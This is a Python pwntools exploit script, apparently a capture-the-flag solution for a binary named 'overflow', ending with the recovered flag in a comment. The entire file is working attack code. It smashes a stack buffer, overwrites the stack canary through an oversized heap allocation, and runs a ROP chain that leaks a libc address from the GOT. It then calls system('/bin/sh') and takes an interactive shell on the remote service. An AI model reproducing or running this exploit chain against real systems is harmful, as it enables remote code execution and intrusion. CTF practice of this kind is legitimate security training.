#!/usr/bin/env python
from pwn import *

#r = remote('127.0.0.1', 4000)
r = remote('10.141.0.202', 56746)
libc = ELF('overflow-libc-2.23.so')

context.arch = 'amd64'

def stack(sz, input):
    r.sendafter('Your choice :', '1')
    r.sendafter('Size :', str(sz))
    r.sendlineafter('Input :', input)

def heap(sz, input):
    r.sendafter('Your choice :', '2')
    r.sendafter('Size :', str(sz))
    r.sendlineafter('Input :', input)

def bss(input):
    r.sendafter('Your choice :', '3')
    r.sendlineafter('Input :', input)

def leave():
    r.sendafter('Your choice :', '4')

pop_rdi_ret = 0x400d93
puts_plt = 0x400830
puts_got = 0x601f98
gets_plt = 0x400870
bss_buf = 0x602f00
pop_rsp_r13_r14_r15_ret = 0x400d8d

rop = flat(
    pop_rdi_ret,
    puts_got,
    puts_plt,
    pop_rdi_ret,
    bss_buf,
    gets_plt,
    pop_rsp_r13_r14_r15_ret,
    bss_buf
)

new_canary = 'B'*8

stack(0x20, 'A'*88+new_canary+'C'*8+rop)
heap(0x21000, 'A'*0x23718+new_canary)
leave()

libc_base = u64(r.recvline()[:-1].ljust(8, '\x00')) - libc.symbols['puts']
log.success('libc base: ' + hex(libc_base))
system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search('/bin/sh\x00'))

sleep(0.5)
r.sendline('A'*24 + p64(pop_rdi_ret) + p64(binsh) + p64(system))

r.interactive()

# FLAG{h3ap_and_st4ck_0v3rfl0w_1s_4asy_4_U}
